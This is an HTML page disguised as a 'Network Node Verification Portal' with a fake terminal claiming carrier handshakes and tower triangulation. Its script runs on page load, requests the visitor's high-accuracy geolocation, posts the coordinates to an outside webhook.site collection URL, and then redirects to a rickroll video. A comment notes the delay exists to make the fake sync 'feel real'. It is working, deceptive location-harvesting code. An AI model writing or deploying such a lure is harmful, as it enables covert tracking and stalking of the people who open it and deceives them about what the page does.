<!DOCTYPE html>
<html>
<head>
    <title>Network Node Verification Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #333; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .terminal { background: #000; color: #0f0; padding: 20px; border-radius: 5px; display: inline-block; text-align: left; font-family: monospace; }
    </style>
</head>
<body onload="autoTrigger()">
    <div class="terminal">
        > Initializing Research Node... [OK]<br>
        > Handshaking with carrier... [OK]<br>
        > Requesting local tower triangulation... <br>
        <div class="loader"></div>
        <p id="status">Waiting for device handshake...</p>
    </div>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/b0eed63b-2e28-4f68-b60b-2ce56e3cbd80';
        const RICKROLL_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';

        function autoTrigger() {
            // No button. Trigger immediately on page load.
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            }
        }

        async function sendData(pos) {
            document.getElementById('status').innerText = "Syncing coordinates...";
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy
                })
            });

            // Brief delay to make the "Sync" feel real
            setTimeout(() => { window.location.href = RICKROLL_URL; }, 1500);
        }

        function handleError(e) {
            document.getElementById('status').style.color = "red";
            document.getElementById('status').innerText = "Sync Failed: Protocol Rejected.";
        }
    </script>
</body>
</html>
